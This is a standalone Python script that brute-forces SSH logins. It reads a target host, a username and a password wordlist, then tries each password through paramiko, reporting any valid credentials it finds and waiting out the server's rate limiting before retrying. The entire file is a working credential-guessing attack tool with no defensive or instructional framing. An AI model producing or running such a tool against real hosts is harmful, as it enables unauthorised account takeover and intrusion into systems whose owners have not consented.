#!/usr/bin/python

import paramiko
import socket
from colors import green, red, reset, blue
import time
import os
import sys

is_verbose = False


def is_ssh_open(host, user, passwd):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=host, username=user, password=passwd, timeout=3)
    except socket.timeout:
        print(f"{red}[!] {host} is unreachable. {reset}")
        return False
    except paramiko.AuthenticationException:
        if is_verbose:
            print(f"[!] Invalid credentials for {user}:{passwd}")
            return False
    except paramiko.SSHException:
        print(f"{blue}[*] Number of tries exceeded, retrying in 10 seconds {reset}")

        start = time.time()
        end = start + 10

        while time.time() < end:
            remaining = end - time.time()
            sys.stdout.write(f"{blue}\rRemaining time: {remaining}s{reset}")
            sys.stdout.flush()
            time.sleep(0.1)

        sys.stdout.write("\n")

        return is_ssh_open(host, user, passwd)
    else:
        print(f"{green}[+] Found {user}:{passwd} {reset}")
        return True


if __name__ == "__main__":
    host = input("Enter an hostname : ")
    user = input("Enter an username : ")
    file = input("Enter password wordlist path : ")
    verbose = input("Verbose (y/n) : ")
    if verbose == "y" or verbose == "yes":
        is_verbose = True
    elif verbose == "n" or verbose == "no":
        is_verbose = False
    else:
        print(f'Please enter "yes" or "no". Default value set to "no".')

    if os.path.exists(os.getcwd() + "/wordlists/" + file):
        path = os.getcwd() + "/wordlists/" + file
        if os.access(path, os.R_OK):
            print(f"\r\nTrying to connect to {user}@{host}:")

            file = open(path, "r")
            for line in file.readlines():
                password = line.strip()
                is_ssh_open(host, user, password)
        else:
            print("Access Denied. Check documentation.")
            exit(0)
    else:
        print("File unreachable. Make sure to check documentation.")
        exit(0)
